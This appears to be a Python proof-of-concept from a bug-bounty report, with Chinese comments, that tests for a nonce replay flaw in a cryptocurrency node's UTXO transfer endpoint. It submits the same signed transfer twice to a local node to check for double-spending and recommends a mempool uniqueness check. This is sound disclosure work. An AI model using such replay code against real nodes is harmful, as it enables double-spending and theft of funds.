#!/usr/bin/env python3
"""
PoC: UTXO Nonce Replay Attack
=============================

严重性: Medium
文件: node/utxo_endpoints.py
赏金: 25 RTC

描述:
    UTXO 转账的 nonce 验证存在缺陷，相同 nonce 的交易可以被
    多个节点接受，导致潜在的重复花费。

复现步骤:
    1. 构造带 nonce 的签名交易
    2. 同时提交到两个节点
    3. 观察两节点都接受该交易
"""

import hashlib
import json
import time
import requests
from typing import Optional, Tuple

# 配置
NODE_URL = "http://localhost:8000"
WALLET_FROM = "RTCtest_wallet_from"
WALLET_TO = "RTCtest_wallet_to"
PUBLIC_KEY = "0123456789abcdef" * 4  # 64 hex chars = 32 bytes
SIGNATURE = "abcdef0123456789" * 4   # 64 hex chars = 32 bytes

def compute_tx_id(inputs: list, outputs: list, timestamp: int) -> str:
    """计算交易 ID"""
    h = hashlib.sha256()
    for inp in sorted(inputs, key=lambda x: x['box_id']):
        h.update(bytes.fromhex(inp['box_id']))
    for out in sorted(outputs, key=lambda x: x['box_id']):
        h.update(bytes.fromhex(out['box_id']))
    h.update(timestamp.to_bytes(8, 'little'))
    return h.hexdigest()

def submit_transfer(nonce: int) -> Tuple[bool, dict]:
    """提交一笔 UTXO 转账交易"""
    
    # 构造签名消息 (与 utxo_endpoints.py 一致)
    tx_data = {
        'from': WALLET_FROM,
        'to': WALLET_TO,
        'amount': 10.0,
        'memo': '',
        'nonce': nonce,
    }
    message = json.dumps(tx_data, sort_keys=True, separators=(',', ':')).encode()
    
    payload = {
        'from_address': WALLET_FROM,
        'to_address': WALLET_TO,
        'amount_rtc': 10.0,
        'public_key': PUBLIC_KEY,
        'signature': SIGNATURE,
        'nonce': nonce,
        'memo': '',
    }
    
    try:
        resp = requests.post(f"{NODE_URL}/utxo/transfer", json=payload, timeout=10)
        result = resp.json()
        return resp.status_code == 200, result
    except Exception as e:
        return False, {'error': str(e)}

def poc_nonce_replay():
    """
    PoC: 演示 nonce 重放攻击
    """
    print("=" * 60)
    print("PoC: UTXO Nonce Replay Attack")
    print("=" * 60)
    
    nonce = int(time.time()) % 1000000
    print(f"\n使用 nonce: {nonce}")
    
    # 场景 1: 提交相同 nonce 的交易两次
    print("\n[场景 1] 提交相同 nonce 到同一节点:")
    success1, result1 = submit_transfer(nonce)
    print(f"  第一次提交: {'成功' if success1 else '失败'}")
    print(f"  结果: {result1.get('tx_id', result1.get('error', 'unknown'))}")
    
    # 如果第一次成功，再提交一次相同 nonce
    if success1:
        success2, result2 = submit_transfer(nonce)
        print(f"\n  第二次提交 (相同 nonce):")
        print(f"  结果: {'成功 - 存在漏洞!' if success2 else '失败 - 已防护'}")
        if success2:
            print(f"  tx_id: {result2.get('tx_id', 'unknown')}")
            print("\n  ⚠️ 漏洞确认: 相同 nonce 的交易被接受两次")
        return success2
    
    return False

def poc_cross_node_replay():
    """
    PoC: 演示跨节点 nonce 重放
    """
    print("\n" + "=" * 60)
    print("PoC: Cross-Node Nonce Replay")
    print("=" * 60)
    
    # 注意: 需要两个节点实例
    # NODE_A 和 NODE_B 应该是不同的节点
    # 这里只是演示结构
    
    nonce = int(time.time()) % 1000000 + 1000
    
    print(f"\n使用 nonce: {nonce}")
    print("需要两个节点实例来测试跨节点重放")
    
    # 如果有多个节点，可以这样测试:
    # success_a = submit_to_node(NODE_A, nonce)
    # success_b = submit_to_node(NODE_B, nonce)
    # if success_a and success_b:
    #     print("⚠️ 漏洞确认: 相同 nonce 在不同节点都被接受")
    
    return None  # 需要手动测试

def main():
    print("\nUTXO Nonce Replay Attack PoC")
    print("=" * 60)
    
    # 检查节点是否可用
    try:
        resp = requests.get(f"{NODE_URL}/utxo/stats", timeout=5)
        if resp.status_code != 200:
            print(f"节点不可用: {resp.status_code}")
            return
    except Exception as e:
        print(f"无法连接到节点: {e}")
        print("请确保节点运行在 localhost:8000")
        return
    
    # 运行 PoC
    result = poc_nonce_replay()
    
    print("\n" + "=" * 60)
    print("结论:")
    if result is True:
        print("  ⚠️ 发现漏洞: Nonce 重放攻击可行")
        print("  建议: 在 mempool 中添加 nonce 唯一性检查")
    elif result is False:
        print("  ✅ 未发现漏洞: Nonce 重放已被防护")
    else:
        print("  ❓ 需要手动测试")
    print("=" * 60)

if __name__ == "__main__":
    main()
